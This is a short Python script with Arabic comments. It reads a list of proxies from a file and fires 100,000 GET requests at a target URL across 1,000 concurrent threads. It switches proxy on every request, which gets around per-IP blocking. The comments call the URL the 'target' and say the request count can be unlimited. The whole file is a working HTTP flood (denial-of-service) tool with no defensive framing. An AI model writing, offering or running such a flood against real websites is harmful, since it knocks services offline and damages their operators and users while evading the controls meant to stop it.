import requests
from concurrent.futures import ThreadPoolExecutor
import random
import itertools

# الرابط المستهدف
url = "https://example.com"

# تحميل البروكسيات من ملف نصي
def load_proxies(file_path):
    proxies = []
    with open(file_path, 'r') as file:
        for line in file:
            proxy = line.strip()
            proxies.append({"http": f"http://{proxy}", "https": f"http://{proxy}"})
    return proxies

# مسار ملف البروكسيات
proxies_file = "proxies.txt"
proxies_list = load_proxies(proxies_file)

# استخدم itertools.cycle لتمرير البروكسيات بشكل لا نهائي
proxy_pool = itertools.cycle(proxies_list)

# عدد الطلبات (يمكن أن يكون غير محدود بشكل نظري)
num_requests = 100000

# وظيفة لإرسال طلب GET مع بروكسي مختلف لكل طلب
def send_request():
    proxy = next(proxy_pool)  # استخدام البروكسي التالي في القائمة
    try:
        response = requests.get(url, proxies=proxy, timeout=5)
        print(f"Status code: {response.status_code}, Proxy: {proxy}")
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}, Proxy: {proxy}")

# استخدام ThreadPoolExecutor لإرسال الطلبات بشكل متزامن
with ThreadPoolExecutor(max_workers=1000) as executor:
    futures = [executor.submit(send_request) for _ in range(num_requests)]